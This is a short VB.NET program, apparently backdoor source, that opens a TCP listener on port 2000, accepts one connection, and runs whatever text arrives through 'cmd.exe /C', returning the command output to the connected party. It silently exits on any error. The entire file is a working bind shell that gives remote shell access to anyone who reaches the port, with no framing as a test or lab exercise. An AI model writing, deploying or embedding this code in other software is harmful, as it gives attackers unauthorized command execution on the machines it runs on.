Imports System.Net.Sockets
Imports System.Text
Imports System.IO
Imports System.Runtime.InteropServices

Module Module1
    Dim list As TcpListener
    Dim tcp As New TcpClient
    Dim ns As NetworkStream
    Public Sub re()
        While True
            Try
                Dim bytes = New Byte(1000) {}
                ns.Read(bytes, 0, bytes.Length)
                ns.Flush()
                Dim msg As String = Encoding.ASCII.GetString(bytes)
                ev(msg)
            Catch ex As Exception
                End
            End Try
        End While
    End Sub
    Public Sub ev(ByVal comando As String)
        Try
            Console.WriteLine(comando)
            Dim start As ProcessStartInfo = New ProcessStartInfo()
            start.FileName = "cmd.exe"
            start.Arguments = "/C " + comando
            start.UseShellExecute = False
            start.RedirectStandardOutput = True
            Using pro As Process = Process.Start(start)
                Using read As StreamReader = pro.StandardOutput
                    Dim rsule As String = read.ReadToEnd
                    Dim ta As Integer = rsule.Length
                    Dim t As String = Convert.ToString(ta)
                    Dim bytes As Byte() = Encoding.ASCII.GetBytes(t)
                    ns.Write(bytes, 0, bytes.Length)
                    ns.Flush()
                    Dim com As Byte() = Encoding.ASCII.GetBytes(rsule)
                    ns.Write(com, 0, com.Length)
                    ns.Flush()
                End Using
            End Using
        Catch ex As Exception
            End
        End Try
    End Sub
    Sub Main()
        Try
            list = New TcpListener(2000)
            list.Start()
            tcp = list.AcceptTcpClient
            ns = tcp.GetStream
            re()
        Catch ex As Exception
            End
        End Try
    End Sub

End Module
